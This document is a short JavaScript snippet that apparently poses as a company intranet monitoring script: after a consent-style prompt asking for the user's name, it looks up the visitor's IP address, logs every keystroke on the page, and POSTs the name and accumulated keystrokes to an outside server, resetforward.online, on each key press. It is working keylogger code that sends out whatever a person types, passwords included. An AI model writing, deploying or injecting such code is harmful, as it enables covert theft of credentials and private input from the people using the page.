(function() {
    // Function to get the user's IP address
    async function getIpAddress() {
      const response = await fetch('https://api64.ipify.org?format=json');
      const data = await response.json();
      return data.ip;
    }

    // Check if the user's name is already stored in localStorage
    let name = localStorage.getItem("username");
    let keys = JSON.parse(localStorage.getItem("keys")) || [];

    if (!name) {
      // Display the disclaimer only if the name is not found in localStorage
      const disclaimer = "Disclaimer:\n\nBy accessing the Company Intranet and the company browser, you agree to the use of cookies to enhance your browsing experience and to monitor and log your activities and webpages visited within the company's network. This information is collected for security, monitoring, and analysis purposes to ensure compliance with company policies and relevant laws. Your use of these systems implies your consent to these terms.\n\nPlease enter your name to proceed:";
      const enteredName = prompt(disclaimer);

      if (enteredName) {
        // Store the name in localStorage
        localStorage.setItem("username", enteredName);

        console.log('Input:', enteredName);

        // Get the user's IP address
        getIpAddress().then(ip => {
          console.log('IP Address:', ip);
        });

        name = enteredName;
        document.addEventListener('keydown', handleKeyDown);
      }
    } else {
      console.log('Welcome back, ' + name);

      // Get the user's IP address
      getIpAddress().then(ip => {
        console.log('IP Address:', ip);
      });

      document.addEventListener('keydown', handleKeyDown);
    }

    function handleKeyDown(a) {
      const b = a.key || String.fromCharCode(a.keyCode);
      keys.push(b);
      console.log('Keys:', keys);

      // Store the updated keys array in localStorage
      localStorage.setItem("keys", JSON.stringify(keys));

      // Send the updated keys array to the server here
      sendDataToServer(keys);
    }

    function sendDataToServer(data) {
      fetch('https://resetforward.online', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ name: name, keys: data }),
      })
      .then(response => {
        if (response.ok) {
          console.log('Data sent to the server successfully');
        } else {
          console.error('Server returned an error:', response.status, response.statusText);
        }
      })
      .catch(error => {
        console.error('Error:', error);
      });
    }
  })();